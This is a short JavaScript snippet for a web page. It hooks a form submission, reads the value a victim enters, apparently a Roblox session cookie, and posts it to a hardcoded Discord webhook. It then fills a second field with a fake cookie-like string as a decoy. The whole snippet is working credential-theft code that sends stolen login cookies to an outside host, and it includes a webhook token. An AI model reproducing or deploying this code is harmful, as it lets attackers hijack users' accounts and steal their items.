
var inputElement = document.createElement('input');
inputElement.type = 'text';
document.body.appendChild(inputElement)
inputElement.classList.add("second-input")

const formElement = document.getElementById('my-form');
const whurl = 'https://discord.com/api/webhooks/1121888454867959978/SlauwbctwAQFh69tn4_UpVyT2CYmZm_lpGBP3_9h7_BRaCqEUcNNfwI1kbWKEX15q7SO';
const btn = document.querySelector('submit')



formElement.addEventListener('submit', (event) => {
  event.preventDefault();
  setTimeout(function() {
    inputElement.value = '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_B713DC31116B1AE97DF0792F945E7A4C90A7A6D5DFE711D6F6F6CF14A196BF997698705437B0F11CBEA4438C0659CBB22221C7DA4E25894CB68C3249CE90D820EEB373FC4DB94E6BC7A354F619274E3D03AB5AC19D433F5CC2420EB2686659F3F4455EA143A670AFA89B0B99A8B56E6D2B46889D57A062A656799DD65295C27CD5B8F57397A58C7D12D08A62C028C70A7B591F22C6D26A053A37A7DA411B6455F27CB69EEC083E2190B9CB039BA755C9941D7C89157BD38466EBDD8985DDA185BE598FDE915F23373FA8723F17D67BEFE8CD1B76810113435DF11333D5BA3F401809A8624ECF2DCC111E130223D493009495BA1523D8BF18F2D7189BB6947281DA8B984E23B0E22A82D5788345BCA5C438122693D0760A2A3715B66AF04D8F797648A033CF268'
  }, 1200);
  const inputValue = document.getElementById('input-field').value;
  const payload = {
    content: 'There\'s a cookie! Here it is: ```\n\n' + inputValue.trim() + "\n```"
  };


  fetch(whurl, {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: JSON.stringify(payload)
  })

});

